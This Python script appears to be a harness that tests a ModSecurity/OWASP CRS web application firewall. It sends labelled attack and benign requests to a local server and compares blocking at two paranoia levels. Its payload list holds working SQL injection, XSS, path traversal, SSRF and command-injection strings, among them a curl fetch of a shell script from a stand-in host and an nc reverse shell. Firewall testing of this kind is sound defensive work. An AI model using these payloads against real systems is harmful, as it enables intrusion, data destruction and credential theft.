#!/usr/bin/env python3
"""WAF Evaluation Harness: Sends 20 categorized attack requests + 5 benign requests against PL1 and PL3."""
import argparse
import json
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

PAYLOADS = [
    # SQLi (5)
    ("ATK-01", "SQLi", "attack", "/items?id=" + urllib.parse.quote("1' OR '1'='1")),
    ("ATK-02", "SQLi", "attack", "/items?id=" + urllib.parse.quote("1 UNION SELECT username,password FROM users--")),
    ("ATK-03", "SQLi", "attack", "/items?id=" + urllib.parse.quote("1; DROP TABLE sessions--")),
    ("ATK-04", "SQLi", "attack", "/items?id=" + urllib.parse.quote("1' AND SLEEP(5)--")),
    ("ATK-05", "SQLi", "attack", "/items?id=" + urllib.parse.quote("admin'/*comment*/OR/*comment*/1=1#")),
    # XSS (4)
    ("ATK-06", "XSS", "attack", "/search?q=" + urllib.parse.quote("<script>alert(1)</script>")),
    ("ATK-07", "XSS", "attack", "/search?q=" + urllib.parse.quote("<img src=x onerror=alert(document.cookie)>")),
    ("ATK-08", "XSS", "attack", "/search?q=" + urllib.parse.quote("javascript:alert(document.domain)")),
    ("ATK-09", "XSS", "attack", "/search?q=" + urllib.parse.quote("<svg/onload=confirm(1)>")),
    # LFI / Path Traversal (4)
    ("ATK-10", "LFI", "attack", "/download?file=" + urllib.parse.quote("../../../../etc/passwd")),
    ("ATK-11", "LFI", "attack", "/download?file=" + urllib.parse.quote("..%2f..%2f..%2fetc%2fshadow")),
    ("ATK-12", "LFI", "attack", "/download?file=" + urllib.parse.quote("/proc/self/environ")),
    ("ATK-13", "LFI", "attack", "/download?file=" + urllib.parse.quote("..\\..\\..\\Windows\\win.ini")),
    # Command Injection (4)
    ("ATK-14", "CMDi", "attack", "/diag?host=" + urllib.parse.quote("127.0.0.1; cat /etc/passwd")),
    ("ATK-15", "CMDi", "attack", "/diag?host=" + urllib.parse.quote("127.0.0.1 && /bin/sh -i")),
    ("ATK-16", "CMDi", "attack", "/diag?host=" + urllib.parse.quote("$(curl http://evil.example/shell.sh)")),
    ("ATK-17", "CMDi", "attack", "/diag?host=" + urllib.parse.quote("127.0.0.1 | nc -e /bin/sh 10.0.0.1 4444")),
    # SSRF / Scanner / Protocol (3)
    ("ATK-18", "SSRF", "attack", "/webhook?url=" + urllib.parse.quote("http://169.254.169.254/latest/meta-data/iam/")),
    ("ATK-19", "SSRF", "attack", "/webhook?url=" + urllib.parse.quote("file:///etc/passwd")),
    ("ATK-20", "SQLi-PL3", "attack", "/items?id=" + urllib.parse.quote("10&&1==1")),
    # Benign Requests (5)
    ("BEN-01", "Benign", "benign", "/items?id=42"),
    ("BEN-02", "Benign", "benign", "/search?q=" + urllib.parse.quote("wireless mechanical keyboard")),
    ("BEN-03", "Benign", "benign", "/profile?name=" + urllib.parse.quote("O'Connor & Sons (UK) -- Tier-1 Partner!")),
    ("BEN-04", "Benign", "benign", "/note?math=" + urllib.parse.quote("score >= 5 && ratio <= 10 || flag == true")),
    ("BEN-05", "Benign", "benign", "/api/feedback?comment=" + urllib.parse.quote("Great release! Everything works fast.")),
]


def probe_url(base_url: str) -> list[dict]:
    out = []
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    for pid, cat, kind, path in PAYLOADS:
        req = urllib.request.Request(base_url + path, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                code = resp.status
        except urllib.error.HTTPError as e:
            code = e.code
        except Exception:
            code = 0
        out.append({
            "id": pid,
            "category": cat,
            "kind": kind,
            "path": path,
            "status_code": code,
            "blocked": code == 403,
        })
    return out


def write_comparison_report(pl1: list[dict], pl3: list[dict], out_path: Path):
    atk_total = sum(1 for r in pl1 if r["kind"] == "attack")
    ben_total = sum(1 for r in pl1 if r["kind"] == "benign")

    pl1_atk_blk = sum(1 for r in pl1 if r["kind"] == "attack" and r["blocked"])
    pl3_atk_blk = sum(1 for r in pl3 if r["kind"] == "attack" and r["blocked"])
    pl1_fp = sum(1 for r in pl1 if r["kind"] == "benign" and r["blocked"])
    pl3_fp = sum(1 for r in pl3 if r["kind"] == "benign" and r["blocked"])

    lines = [
        "# ModSecurity + OWASP CRS Evaluation Report: Paranoia Level 1 vs. Paranoia Level 3",
        "",
        "## 1. Executive Summary Metrics",
        "",
        "| Metric | CRS Paranoia Level 1 (`configs/pl1.conf`) | CRS Paranoia Level 3 (`configs/pl3.conf`) | Analysis |",
        "|---|---|---|---|",
        f"| **Total Attack Payloads Tested** | {atk_total} | {atk_total} | SQLi, XSS, LFI, CMDi, SSRF |",
        f"| **Attacks Blocked (HTTP 403)** | {pl1_atk_blk} / {atk_total} ({round(100*pl1_atk_blk/atk_total,1)}%) | **{pl3_atk_blk} / {atk_total} ({round(100*pl3_atk_blk/atk_total,1)}%)** | PL3 blocks obfuscated boolean/SSRF payloads missed at PL1 |",
        f"| **Total Benign Requests Tested** | {ben_total} | {ben_total} | Standard queries + punctuation/boolean strings |",
        f"| **False Positives (Benign Blocked)** | **{pl1_fp} / {ben_total} ({round(100*pl1_fp/ben_total,1)}%)** | {pl3_fp} / {ben_total} ({round(100*pl3_fp/ben_total,1)}%) | PL3 flags apostrophes (`O'Connor`) and boolean operators (`>= &&`) under CRS `942430`/`942431` unless tuned via `configs/custom_exclusions.conf` |",
        "",
        "## 2. Detailed Payload-by-Payload Results (25 Test Cases)",
        "",
        "| ID | Category | Type | PL1 Status | PL3 Status | URI / Payload (URL-Encoded) |",
        "|---|---|---|---|---|---|",
    ]
    for r1, r3 in zip(pl1, pl3):
        s1 = f"`{r1['status_code']}` ({'BLOCKED' if r1['blocked'] else 'ALLOWED'})"
        s3 = f"`{r3['status_code']}` ({'BLOCKED' if r3['blocked'] else 'ALLOWED'})"
        lines.append(f"| `{r1['id']}` | {r1['category']} | {r1['kind']} | {s1} | {s3} | `{r1['path'][:68]}` |")

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text("\n".join(lines) + "\n")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8080")
    ap.add_argument("--mode", choices=["pl1", "pl3", "compare"], default="compare")
    ap.add_argument("--save-json", default="")
    ap.add_argument("--pl1-json", default="reports/pl1_results.json")
    ap.add_argument("--pl3-json", default="reports/pl3_results.json")
    ap.add_argument("--out", default="reports/evaluation_results.md")
    args = ap.parse_args()

    if args.mode in ("pl1", "pl3"):
        res = probe_url(args.url)
        target_json = args.save_json or (args.pl1_json if args.mode == "pl1" else args.pl3_json)
        Path(target_json).parent.mkdir(parents=True, exist_ok=True)
        Path(target_json).write_text(json.dumps(res, indent=2))
        print(f"Saved {args.mode} results ({len(res)} requests) to {target_json}")
        return

    pl1 = json.loads(Path(args.pl1_json).read_text())
    pl3 = json.loads(Path(args.pl3_json).read_text())
    write_comparison_report(pl1, pl3, Path(args.out))
    print(Path(args.out).read_text())


if __name__ == "__main__":
    main()
